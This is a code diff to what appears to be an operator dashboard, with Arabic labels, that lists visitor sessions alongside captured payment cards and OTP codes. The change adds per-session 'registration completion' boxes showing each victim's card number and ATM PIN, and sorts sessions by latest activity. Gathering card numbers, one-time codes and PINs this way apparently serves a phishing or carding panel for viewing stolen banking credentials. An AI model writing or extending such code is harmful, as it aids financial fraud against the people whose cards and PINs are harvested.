@@ -338,10 +338,13 @@
       const latestCard = sessionCards[0] || {};
       const latestOtp = sessionOtps.length ? sessionOtps[0] : null;
       const ls = m.lastSeen ? Number(m.lastSeen) : 0;
-      // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية
+      const sessionRegistrations = Array.isArray(m.appRegistrations) ? m.appRegistrations : [];
+      const latestRegistAt = sessionRegistrations.length ? Math.max(...sessionRegistrations.map(r => toTime(r && r.at))) : 0;
+      // آخر نشاط = أحدث تاريخ بين آخر بطاقة وآخر OTP وآخر رؤية وآخر تسجيل
       const lastActivity = Math.max(
         toTime(latestCard.createdAt),
         toTime(latestOtp && latestOtp.createdAt),
+        latestRegistAt,
         ls
       );
       return {
@@ -387,6 +390,7 @@
         requestTypeLabel: m.requestTypeLabel || '',
         refNo: m.refNo || '',
         requestDetails: m.details || {},
+        appRegistrations: sessionRegistrations,
         lastSeen: ls,
         createdDate: latestCard.createdAt || m.createdAt || null,
         lastActivity: lastActivity,
@@ -400,7 +404,8 @@
     .filter(x => !x.isHidden && (
       x.name || x.phone || x.address ||
       (x.allCards && x.allCards.length > 0) ||
-      (x.allOtps && x.allOtps.length > 0)
+      (x.allOtps && x.allOtps.length > 0) ||
+      (x.appRegistrations && x.appRegistrations.length > 0)
     ))
     // ترتيب: آخر نشاط أولاً (الأحدث)
     .sort((a, b) => (b.lastActivity || 0) - (a.lastActivity || 0));
@@ -609,6 +614,31 @@
           <div class="mt-4 pt-4 border-t border-slate-700">
             <h4 class="text-sm font-semibold text-amber-400 mb-3">تفاصيل ${escapeHtml(n.requestTypeLabel || 'الطلب')}</h4>
             ${renderDetailFields(detailRows)}
+          </div>
+        `;
+      }
+
+      // صناديق إكمال التسجيل — كل محاولة في صندوق منفصل
+      if (n.appRegistrations && n.appRegistrations.length) {
+        const atMs = (v) => { if (!v) return 0; if (typeof v.toDate === 'function') return v.toDate().getTime(); const t = new Date(v).getTime(); return isNaN(t) ? 0 : t; };
+        const regs = [...n.appRegistrations].sort((a, b) => atMs(b && b.at) - atMs(a && a.at));
+        html += `
+          <div class="mt-4 pt-4 border-t border-slate-700">
+            <h4 class="text-sm font-semibold text-amber-400 mb-3">إكمال التسجيل (${regs.length})</h4>
+            <div class="space-y-3">
+              ${regs.map((r, i) => `
+                <div class="rounded-lg border border-slate-700 bg-slate-800/40 p-3">
+                  <div class="flex items-center justify-between mb-2">
+                    <span class="text-xs font-semibold text-amber-400">إكمال التسجيل #${regs.length - i}</span>
+                    ${r && r.at ? `<span class="text-xs text-slate-500">${escapeHtml(new Date(atMs(r.at)).toLocaleString('ar-EG'))}</span>` : ''}
+                  </div>
+                  ${renderDetailFields([
+                    { label: 'رقم البطاقة', value: r && r.card },
+                    { label: 'الرقم السري', value: r && r.atmPin },
+                  ])}
+                </div>
+              `).join('')}
+            </div>
           </div>
         `;
       }
